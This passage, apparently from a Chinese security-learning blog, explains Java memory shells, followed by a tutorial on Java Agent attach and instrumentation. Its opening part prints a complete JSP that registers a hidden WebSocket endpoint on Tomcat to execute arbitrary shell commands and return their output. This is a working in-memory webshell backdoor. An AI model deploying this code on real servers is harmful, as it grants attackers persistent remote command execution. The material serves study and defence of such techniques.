<li>定义一个恶意类，并创建一个ServerEndpointConfig，给这个恶意类分配URI path</li>
<li>调用ServerContainer.addEndpoint方法，将创建的ServerEndpointConfig添加进去</li>
</ol>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ServerContainer</span> <span class="variable">container</span> <span class="operator">=</span> (ServerContainer) req.getServletContext().getAttribute(ServerContainer.class.getName());</span><br><span class="line"><span class="type">ServerEndpointConfig</span> <span class="variable">config</span> <span class="operator">=</span> ServerEndpointConfig.Builder.create(evil.class, <span class="string">&quot;/ws&quot;</span>).build();</span><br><span class="line">container.addEndpoint(config);</span><br></pre></td></tr></table></figure>
<h4 id="2-5-3完整的jsp注入">2.5.3完整的jsp注入</h4>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;javax.websocket.server.ServerEndpointConfig&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;javax.websocket.server.ServerContainer&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;javax.websocket.*&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.*&quot;</span> %&gt;</span><br><span class="line"></span><br><span class="line">&lt;%!</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">C</span> <span class="keyword">extends</span> <span class="title class_">Endpoint</span> <span class="keyword">implements</span> <span class="title class_">MessageHandler</span>.Whole&lt;String&gt; &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> Session session;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onMessage</span><span class="params">(String s)</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Process process;</span><br><span class="line"></span><br><span class="line">                <span class="type">boolean</span> <span class="variable">bool</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>).toLowerCase().startsWith(<span class="string">&quot;windows&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span> (bool) &#123;</span><br><span class="line">                    process = Runtime.getRuntime().exec(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, s&#125;);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    process = Runtime.getRuntime().exec(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;/bin/bash&quot;</span>, <span class="string">&quot;-c&quot;</span>, s&#125;);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> process.getInputStream();</span><br><span class="line">                <span class="type">StringBuilder</span> <span class="variable">stringBuilder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line"></span><br><span class="line">                <span class="type">int</span> i;</span><br><span class="line">                <span class="keyword">while</span> ((i = inputStream.read()) != -<span class="number">1</span>)</span><br><span class="line">                    stringBuilder.append((<span class="type">char</span>)i);</span><br><span class="line">                inputStream.close();</span><br><span class="line"></span><br><span class="line">                process.waitFor();</span><br><span class="line">                session.getBasicRemote().sendText(stringBuilder.toString());</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception exception) &#123;</span><br><span class="line">                exception.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onOpen</span><span class="params">(<span class="keyword">final</span> Session session, EndpointConfig config)</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.session = session;</span><br><span class="line">            session.addMessageHandler(<span class="built_in">this</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    <span class="comment">// String path = request.getParameter(&quot;path&quot;);</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> <span class="string">&quot;/evil&quot;</span>;</span><br><span class="line">    <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getSession().getServletContext();</span><br><span class="line">    <span class="type">ServerEndpointConfig</span> <span class="variable">configEndpoint</span> <span class="operator">=</span> ServerEndpointConfig.Builder.create(C.class, path).build();</span><br><span class="line">    <span class="type">ServerContainer</span> <span class="variable">container</span> <span class="operator">=</span> (ServerContainer) servletContext.getAttribute(ServerContainer.class.getName());</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (servletContext.getAttribute(path) == <span class="literal">null</span>) &#123;</span><br><span class="line">            container.addEndpoint(configEndpoint);</span><br><span class="line">            servletContext.setAttribute(path, path);</span><br><span class="line">        &#125;</span><br><span class="line">        out.println(<span class="string">&quot;success, connect url path: &quot;</span> + servletContext.getContextPath() + path);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        out.println(e.toString());</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
<p>参考：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/11549?time__1311=mqmx0DBD2Gd4lOz30%3D3G%3DWwRQDuBhCoD&amp;alichlgref=https%3A%2F%2Fwww.google.com.hk%2F">https://xz.aliyun.com/t/11549?time__1311=mqmx0DBD2Gd4lOz30%3D3G%3DWwRQDuBhCoD&amp;alichlgref=https%3A%2F%2Fwww.google.com.hk%2F</a></p>
<p><a target="_blank" rel="noopener" href="https://paoka1.top/2023/04/21/Tomcat-WebSocket-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/">https://paoka1.top/2023/04/21/Tomcat-WebSocket-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/11566?time__1311=mqmx0DBD2QK7uD0vofDyACFwRQKDu7gYD&amp;alichlgref=https%3A%2F%2Fwww.google.com.hk%2F">https://xz.aliyun.com/t/11566?time__1311=mqmx0DBD2QK7uD0vofDyACFwRQKDu7gYD&amp;alichlgref=https%3A%2F%2Fwww.google.com.hk%2F</a></p>
<p><a target="_blank" rel="noopener" href="https://veo.pub/2022/memshell/#3-websocket%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E6%96%B9%E6%B3%95">https://veo.pub/2022/memshell/#3-websocket%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E6%96%B9%E6%B3%95</a></p>
<h3 id="2-6upgrade内存马">2.6upgrade内存马</h3>
<p>参考：<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/RuP8cfjUXnLVJezBBBqsYw">https://mp.weixin.qq.com/s/RuP8cfjUXnLVJezBBBqsYw</a></p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/345119.html">https://www.freebuf.com/vuls/345119.html</a></p>
<h3 id="2-7executor内存马">2.7executor内存马</h3>
<p>参考：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/11593?time__1311=mqmx0DBD2QD%3D%3DBKDsKE4fD9DNqTeoTD">https://xz.aliyun.com/t/11593?time__1311=mqmx0DBD2QD%3D%3DBKDsKE4fD9DNqTeoTD</a></p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/344812.html">https://www.freebuf.com/vuls/344812.html</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/11613">https://xz.aliyun.com/t/11613</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/13639">https://xz.aliyun.com/t/13639</a></p>
<h2 id="3-agent内存马">3.agent内存马</h2>
<p>参考：<a target="_blank" rel="noopener" href="https://goodapple.top/archives/1355">https://goodapple.top/archives/1355</a></p>
<p><a target="_blank" rel="noopener" href="https://drun1baby.top/2023/12/07/Java-Agent-%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/#Instrumentation-%E7%9A%84%E5%B1%80%E9%99%90%E6%80%A7">https://drun1baby.top/2023/12/07/Java-Agent-%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/#Instrumentation-%E7%9A%84%E5%B1%80%E9%99%90%E6%80%A7</a></p>
<p>我们知道Java是一种静态强类型语言，在运行之前必须将其编译成.class字节码，然后再交给JVM处理运行。Java Agent就是一种能在不影响正常编译的前提下，修改Java字节码，进而动态地修改已加载或未加载的类、属性和方法的技术。</p>
<p>实际上，平时较为常见的技术如热部署、一些诊断工具等都是基于Java Agent技术来实现的。那么Java Agent技术具体是怎样实现的呢？</p>
<p>对于Agent（代理）来讲，其大致可以分为两种，一种是在JVM启动前加载的premain-Agent，另一种是JVM启动之后加载的agentmain-Agent。这里我们可以将其理解成一种特殊的Interceptor（拦截器），如下图<img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/jpeg/25729212/1717067466354-1c0bd6eb-7c4f-4b39-a861-ebd636722a00.jpeg" alt=""><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/jpeg/25729212/1717067470239-a162a378-4e14-4137-a7d1-90c3a10fae26.jpeg" alt=""></p>
<h3 id="Java-Agent示例">Java Agent示例</h3>
<h4 id="premain-Agent">premain-Agent</h4>
<p>我们首先来实现一个简单的premain-Agent，创建一个Maven项目，编写一个简单的premain-Agent</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.java.premain.agent;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.Instrumentation;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Java_Agent_premain</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">premain</span><span class="params">(String args, Instrumentation inst)</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span><span class="number">0</span> ; i&lt;<span class="number">10</span> ; i++)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;调用了premain-Agent！&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>接着在resource/META-INF/下创建MANIFEST.MF清单文件用以指定premain-Agent的启动类</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Manifest-Version: <span class="number">1.0</span></span><br><span class="line">Premain-Class: com.java.premain.agent.Java_Agent_premain</span><br><span class="line"> </span><br></pre></td></tr></table></figure>
<p>将其打包成jar文件</p>
<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1717067514381-4045842b-638b-40ea-8ebf-37cac288d151.png" alt=""><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1717067525182-1ce5a737-b3cb-462f-ba62-47a213388bcb.png" alt=""></p>
<p>然后直接build就可以了</p>
<p>创建一个目标类</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hello</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Hello World!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>添加JVM Options（注意冒号之后不能有空格）</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-javaagent:<span class="string">&quot;out/artifacts/Java_Agent_jar/Java_Agent.jar&quot;</span></span><br></pre></td></tr></table></figure>
<p>运行结果如下</p>
<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1717067589774-a75d3cf2-f437-464d-87de-0d16e55c801f.png" alt=""></p>
<h4 id="agentmain-Agent">agentmain-Agent</h4>
<p>相较于premain-Agent只能在JVM启动前加载，agentmain-Agent能够在JVM启动之后加载并实现相应的修改字节码功能。下面我们来了解一下和JVM有关的两个类。</p>
<h5 id="VirtualMachine类">VirtualMachine类</h5>
<p>com.sun.tools.attach.VirtualMachine类可以实现获取JVM信息，内存dump、现成dump、类信息统计（例如JVM加载的类）等功能。</p>
<p>该类允许我们通过给attach方法传入一个JVM的PID，来远程连接到该JVM上 ，之后我们就可以对连接的JVM进行各种操作，如注入Agent。下面是该类的主要方法</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//允许我们传入一个JVM的PID，然后远程连接到该JVM上</span></span><br><span class="line">VirtualMachine.attach()</span><br><span class="line"> </span><br><span class="line"><span class="comment">//向JVM注册一个代理程序agent，在该agent的代理程序中会得到一个Instrumentation实例，该实例可以 在class加载前改变class的字节码，也可以在class加载后重新加载。在调用Instrumentation实例的方法时，这些方法会使用ClassFileTransformer接口中提供的方法进行处理</span></span><br><span class="line">VirtualMachine.loadAgent()</span><br><span class="line"> </span><br><span class="line"><span class="comment">//获得当前所有的JVM列表</span></span><br><span class="line">VirtualMachine.list()</span><br><span class="line"> </span><br><span class="line"><span class="comment">//解除与特定JVM的连接</span></span><br><span class="line">VirtualMachine.detach()</span><br></pre></td></tr></table></figure>
<h5 id="VirtualMachineDescriptor类">VirtualMachineDescriptor类</h5>
<p>com.sun.tools.attach.VirtualMachineDescriptor类是一个用来描述特定虚拟机的类，其方法可以获取虚拟机的各种信息如PID、虚拟机名称等。下面是一个获取特定虚拟机PID的示例</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.tools.attach.VirtualMachine;</span><br><span class="line"><span class="keyword">import</span> com.sun.tools.attach.VirtualMachineDescriptor;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">get_PID</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//调用VirtualMachine.list()获取正在运行的JVM列表</span></span><br><span class="line">        List&lt;VirtualMachineDescriptor&gt; list = VirtualMachine.list();</span><br><span class="line">        <span class="keyword">for</span>(VirtualMachineDescriptor vmd : list)&#123;</span><br><span class="line">            </span><br><span class="line">            <span class="comment">//遍历每一个正在运行的JVM，如果JVM名称为get_PID则返回其PID</span></span><br><span class="line">            <span class="keyword">if</span>(vmd.displayName().equals(<span class="string">&quot;get_PID&quot;</span>))</span><br><span class="line">            System.out.println(vmd.id());</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">##</span><br><span class="line"><span class="number">4908</span></span><br><span class="line"> </span><br><span class="line">Process finished with exit code <span class="number">0</span></span><br></pre></td></tr></table></figure>
<p>下面我们就来实现一个agentmain-Agent。首先我们编写一个Hello类，模拟正在运行的JVM</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> java.lang.Thread.sleep;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">hello</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>)&#123;</span><br><span class="line">            hello();</span><br><span class="line">            sleep(<span class="number">3000</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">hello</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Hello World!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>同时配置MANIFEST.MF文件</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.java.agentmain.agent;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.Instrumentation;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> java.lang.Thread.sleep;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Java_Agent_agentmain</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">agentmain</span><span class="params">(String args, Instrumentation inst)</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;调用了agentmain-Agent!&quot;</span>);</span><br><span class="line">            sleep(<span class="number">3000</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>同时配置MANIFEST.MF文件</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Manifest-Version: <span class="number">1.0</span></span><br><span class="line">Agent-Class: com.java.agentmain.agent.Java_Agent_agentmain</span><br><span class="line"> </span><br></pre></td></tr></table></figure>
<p>编译打包成jar文件out/artifacts/Java_Agent_jar/Java_Agent.jar</p>
<p>最后编写一个Inject_Agent类，获取特定JVM的PID并注入Agent</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.java.inject;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> com.sun.tools.attach.*;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Inject_Agent</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, AttachNotSupportedException, AgentLoadException, AgentInitializationException &#123;</span><br><span class="line">        <span class="comment">//调用VirtualMachine.list()获取正在运行的JVM列表</span></span><br><span class="line">        List&lt;VirtualMachineDescriptor&gt; list = VirtualMachine.list();</span><br><span class="line">        <span class="keyword">for</span>(VirtualMachineDescriptor vmd : list)&#123;</span><br><span class="line"> </span><br><span class="line">            <span class="comment">//遍历每一个正在运行的JVM，如果JVM名称为Sleep_Hello则连接该JVM并加载特定Agent</span></span><br><span class="line">            <span class="keyword">if</span>(vmd.displayName().equals(<span class="string">&quot;Sleep_Hello&quot;</span>))&#123;</span><br><span class="line"> </span><br><span class="line">                <span class="comment">//连接指定JVM</span></span><br><span class="line">                <span class="type">VirtualMachine</span> <span class="variable">virtualMachine</span> <span class="operator">=</span> VirtualMachine.attach(vmd.id());</span><br><span class="line">                <span class="comment">//加载Agent</span></span><br><span class="line">                virtualMachine.loadAgent(<span class="string">&quot;out/artifacts/Java_Agent_jar/Java_Agent.jar&quot;</span>);</span><br><span class="line">                <span class="comment">//断开JVM连接</span></span><br><span class="line">                virtualMachine.detach();</span><br><span class="line">            &#125;</span><br><span class="line"> </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1717067723017-18de439f-c450-4b2c-8958-9db93b21ac2a.png" alt=""></p>
<h4 id="Instrumentation">Instrumentation</h4>
<p>Instrumentation是 JVMTIAgent（JVM Tool Interface Agent）的一部分，Java agent通过这个类和目标 JVM 进行交互，从而达到修改数据的效果。</p>
<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1717067744447-044667fb-715a-499d-a6a9-7e2506ed036e.png" alt=""></p>
<p>其在Java中是一个接口，常用方法如</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Instrumentation</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//增加一个Class 文件的转换器，转换器用于改变 Class 二进制流的数据，参数 canRetransform 设置是否允许重新转换。</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">addTransformer</span><span class="params">(ClassFileTransformer transformer, <span class="type">boolean</span> canRetransform)</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">//在类加载之前，重新定义 Class 文件，ClassDefinition 表示对一个类新的定义，如果在类加载之后，需要使用 retransformClasses 方法重新定义。addTransformer方法配置之后，后续的类加载都会被Transformer拦截。对于已经加载过的类，可以执行retransformClasses来重新触发这个Transformer的拦截。类加载的字节码被修改后，除非再次被retransform，否则不会恢复。</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">addTransformer</span><span class="params">(ClassFileTransformer transformer)</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">//删除一个类转换器</span></span><br><span class="line">    <span class="type">boolean</span> <span class="title function_">removeTransformer</span><span class="params">(ClassFileTransformer transformer)</span>;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    <span class="comment">//在类加载之后，重新定义 Class。这个很重要，该方法是1.6 之后加入的，事实上，该方法是 update 了一个类。</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">retransformClasses</span><span class="params">(Class&lt;?&gt;... classes)</span> <span class="keyword">throws</span> UnmodifiableClassException;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    <span class="comment">//判断一个类是否被修改</span></span><br><span class="line">    <span class="type">boolean</span> <span class="title function_">isModifiableClass</span><span class="params">(Class&lt;?&gt; theClass)</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 获取目标已经加载的类。</span></span><br><span class="line">    <span class="meta">@SuppressWarnings(&quot;rawtypes&quot;)</span></span><br><span class="line">    Class[] getAllLoadedClasses();</span><br><span class="line"> </span><br><span class="line">    <span class="comment">//获取一个对象的大小</span></span><br><span class="line">    <span class="type">long</span> <span class="title function_">getObjectSize</span><span class="params">(Object objectToSize)</span>;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="获取目标JVM已加载类">获取目标JVM已加载类</h5>
<p>下面我们简单实现一个能够获取目标JVM已加载类的agentmain-Agent</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.java.agentmain.instrumentation;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.Instrumentation;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Java_Agent_agentmain_Instrumentation</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">agentmain</span><span class="params">(String args, Instrumentation inst)</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">        Class [] classes = inst.getAllLoadedClasses();</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">for</span>(Class cls : classes)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;------------------------------------------&quot;</span>);</span><br><span class="line">            System.out.println(<span class="string">&quot;加载类: &quot;</span>+cls.getName());</span><br><span class="line">            System.out.println(<span class="string">&quot;是否可被修改: &quot;</span>+inst.isModifiableClass(cls));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>结果</p>
